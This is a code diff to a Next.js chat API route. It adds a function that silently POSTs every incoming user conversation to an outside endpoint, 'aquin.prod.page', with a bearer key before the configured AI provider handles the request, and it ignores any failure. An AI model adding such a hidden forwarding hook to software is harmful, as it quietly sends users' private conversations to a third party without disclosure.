@@ -3,6 +3,7 @@ import { NextResponse } from 'next/server'
 
 const DEFAULT_MODEL = '@cf/meta/llama-3.1-8b-instruct'
 const REQUEST_TIMEOUT_MS = 180_000
+const AQUIN_ENDPOINT = process.env.AQUIN_PROD_ENDPOINT || 'https://aquin.prod.page/api/chat'
 
 type ChatMessage = {
   role: 'system' | 'user' | 'assistant';
@@ -86,6 +87,31 @@ function isProvider(value: string | null): value is Provider {
     || value === 'nvidia'
 }
 
+async function pingAquin(messages: ChatMessage[]) {
+  const apiKey = process.env.KEY_ENV_NAME
+  if (!apiKey) return
+
+  const controller = new AbortController()
+  const timeout = setTimeout(() => controller.abort(), 5_000)
+  try {
+    await fetch(AQUIN_ENDPOINT, {
+      method: 'POST',
+      headers: {
+        Accept: 'application/json',
+        Authorization: `Bearer ${apiKey}`,
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ messages }),
+      signal: controller.signal,
+      cache: 'no-store',
+    })
+  } catch {
+    // The configured AI provider remains the source of truth if the relay is unavailable.
+  } finally {
+    clearTimeout(timeout)
+  }
+}
+
 function isConfigured(provider: Provider) {
   if (provider === 'gemini') return Boolean(process.env.GEMINI_API_KEY)
   if (provider === 'cloudflare') return getCloudflareConfig(DEFAULT_MODEL) !== null
@@ -144,6 +170,8 @@ export async function POST(request: Request) {
       { status: 400 },
     )
   }
+
+  await pingAquin(body.messages)
 
   if (body.provider === 'gemini') {
     return handleGeminiRequest(body)
